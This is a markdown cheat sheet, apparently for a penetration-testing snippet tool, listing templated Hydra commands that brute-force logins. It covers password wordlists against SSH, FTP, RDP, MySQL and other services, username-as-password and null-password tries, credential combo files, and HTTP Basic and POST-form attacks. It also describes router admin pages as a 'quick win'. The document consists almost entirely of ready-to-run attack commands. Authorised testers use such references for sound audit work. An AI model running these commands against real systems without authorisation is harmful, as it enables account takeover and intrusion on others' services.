# Hydra

<!-- cheat
export hydra
var scheme_hydra_protocol = printf '%s\n' ftp ssh imap pop3s mssql rdp vnc smtp mysql --- --header 'Service to bruteforce'
import wordlist_passwords
import wordlists_users
-->

## hydra - brute force

### Brute service login

Brute one user with a password list against the chosen service (FTP, SSH, IMAP, MSSQL, RDP, VNC, SMTP, MySQL, etc.).

```sh title:"Hydra Single user, password list against chosen service"
hydra -l $user -P $wordlists $scheme_hydra_protocol://$domain
```
<!-- cheat
import hydra
import users
import domain_ip
-->

### User and password lists

Brute a chosen service with user and password lists.

```sh title:"Hydra User list and password list against chosen service"
hydra -L "$wordlists_users" -P "$wordlists" "$rhost_ip" "$scheme_hydra_protocol"
```
<!-- cheat
import hydra
var rhost_ip
-->

### Single password

Try one username and one password against SSH.

```sh title:"Hydra Single SSH username and password"
hydra -l "$user" -p "$pass" "$rhost_ip" ssh
```
<!-- cheat
var user
var pass
var rhost_ip
-->

### Username as password

Try each username as its own password against SSH.

```sh title:"Hydra Try username as password against SSH"
hydra -L "$wordlists_users" -e s "$rhost_ip" ssh
```
<!-- cheat
import hydra
var rhost_ip
-->

### Null password

Try a null password against SSH for one username.

```sh title:"Hydra Try null password against SSH"
hydra -l "$user" -e n "$rhost_ip" ssh
```
<!-- cheat
var user
var rhost_ip
-->

### Login-pass file

Use a `user:pass` combo file against SSH on a custom port.

```sh title:"Hydra Use user:pass combo file against SSH"
hydra -t 4 -s "$rport" -C "$combo_file" "$rhost_ip" ssh
```
<!-- cheat
var rport := 22
var combo_file
var rhost_ip
-->

### Brute HTTP basic auth

Brute HTTP Basic auth on the document root. Quick win against router admin pages and old internal apps.

```sh title:"Hydra Brute HTTP Basic auth at document root"
hydra -l $user -P $wordlists $domain http-get
```
<!-- cheat
import hydra
import users
import domain_ip
-->

### Brute HTTP POST form

Brute a form-based login over HTTP POST. Edit the path, parameter names, and the failure-string (`F=incorrect`) to match the target app.

```sh title:"Hydra Brute form login, edit path/params/failure marker"
hydra -l $user -P $wordlists $domain http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
<!-- cheat
import hydra
import users
import domain_ip
-->
